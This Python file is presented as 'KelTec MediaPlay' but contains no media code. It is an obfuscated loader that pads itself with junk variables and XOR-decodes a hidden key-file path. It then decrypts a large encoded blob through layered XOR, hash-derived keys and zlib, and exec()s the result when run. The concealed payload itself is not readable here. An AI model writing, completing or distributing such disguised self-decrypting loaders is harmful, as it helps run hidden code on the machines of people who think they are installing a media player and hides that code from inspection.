# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 691239 ^ 346795
_lx1_1 = len("69b966")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-893884)
_lx3_3 = 379420 * 0
_lx4_4 = 366576 ^ 509324
_M = '6CifdNNxkRtvWsiPy3+Twf+1HI5mJBkHe06u10rlCYWoJs4shj2RRGxYwI7EfcXJ8+ZO2TQgSlInHaXQSrJc3/0qnHfWaJJNZl3K'
_D = '=EbYXJD6KWXm7ClcajpOfQzsipSwDqSh2ZScJdFi2RUQs/Q/ViDds8i1tinoKV2IOiiH2Xsv0X9EvpVmxluW/uRCukeX8PsauZRocjxVSh/fmrstr1LkrPs14MAogNlGFmy5CFPjTw2CjaiRWjvsOpYzUMw8nnwdcrupQuLF2KlIJhRUcgrq1LItBci0rNy5lJs/AlFTLM7cEsIwJCdFc1q/Mp7THzuGwbMQAbHQMPKfIhxYoqZF4LP0ZygszfhOlILai97YqM7eHdcxZxUGEDBv3zXWccAEJc6EGm3j5KZwEeaE0n+RpUY+mT9KjbzqRioUoQy4lASPRuqyTqJlYO9kSsjElUrIac4QpgwqLYS0b1N/SLR02scRzbomD2479vX2fGtHl0CqNmy+V4Jj43aigJVt3YFEKrQkvhZK6YLOfsoMUzh3rx8myqu2NbP3Pf4ewcLnajgFxgzRXAMlwjfouHA7xyovQ79vprANVqsmOkJ3YDhleGIhBOtA3kzsQamvYhU6CXZf4KcmVgvGAmQN0u1JIcn0/OmjOlnqLabA6qt4pVaHrzSTDNulWv93WBLrSZ7oNo99rIYxA4+gJSrIauSpX4sv2wA9/gCkibFs1k8PkbyFK7jn8mbEnXhDu6bNmA8kbfvH6ZOP+TYuZBT7kFjickYuL/8POAJHbcmVUET02VkV/jfmILef7UTAvn/cE33bKTfELfBgOzMreb5kpfTwDDW+uPkwQdWWG6alqGWz1v1MRB4kML34kTtvwGhPOwWLQqEf3B9ekQI8+0cBqJ7do4FwmO3PoGYtLlAU8dWc+NQ3ELec9ryxq0VxaE4Y45N6iiatWz2p8V24MU/BUDCm0j3NouieQGaWnhHTg0JRRpk3qmoAjhS7DiwsI1dVYpz/m09XaDHvzsPpnttyBTWGz07IAObGwofkGStdesy374HAVdHPkGM5yo64hRApVc2/dlZiZMjZnZVpLNXTgkrISCtYF/mKnmVEwnwoER27XrAPL1E2m5pI3GzfYjFUL7g+JpxaHqKHQxRv7B0PxSmg1OuleaLb5VL67V568xgWWgcM+zDJ6haigg9SCrbYJ1sgM4B4I09KIW4VV+YtxjD5c1u2m6td1xYVJ81krDotST3RlSNngUKzzJ52j3K1+BBlsT/P8kZ6ObKjDJ4EIoPYLDE9vYgjuov2qun6v9Vorr7AD8DKXJq4nXlRlcz3LYeIjvJvVWTtE7MeYL4ZEwlKoLu1Cfu+hhjW7tE5xIvy6huysFdKf/R/uAtoHM1JyzaAV6mMoK/GGIgpNNG5C3Szr7YwPtFbKkpypgcLFyXfhbvZHLs17rPf/49MbZbiMbPdDOhySF0nGohVuFBLE/UXGJM63obfEVvd6oKRG82u4vOsEyHGrKDcaHTXMAaVvceSaw0XcLBuE0qpEz9PpBjjv+4BKucCYlLKwTPrNT4rZ60vf94jmzL1o/MbCCdt5y1eaNbZiiVQksxMeyrk6E1BAz5bQyWhc6p8jFF/FmX6Xr9gjox8LKoWPlw4GOvT1Fp2hA0D6A6j0y8a3ELgogCz93uulfUlsWjFYvG9ILqjjc7k7PDpSizF'

_c82a=[233,250,41,166,109,96,208,133]+[172,87,197,113,99,238,25,205]
_8275=[209,57,22,30,138,197,120,136]+[126,158,154,137,96,244,54,94]
_d42d=bytes([a^b for a,b in zip([155,159,90,201,24,18,179,224,223,120,161,16,23,143],_c82a*8)]).decode()
_438e=bytes([a^b for a,b in zip([162,92,98,106,227,171,31,251,80,252,243,231],_8275*8)]).decode()
_8954=_o.path.join(_o.path.dirname(_o.path.abspath(__file__)),*_d42d.split('/'),_438e)
with open(_8954,'r') as _f:_K=_f.read().strip()
def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    exec(compile(src,'<mediaplay>','exec'),{'__name__':'__main__','__file__':__file__})
_run()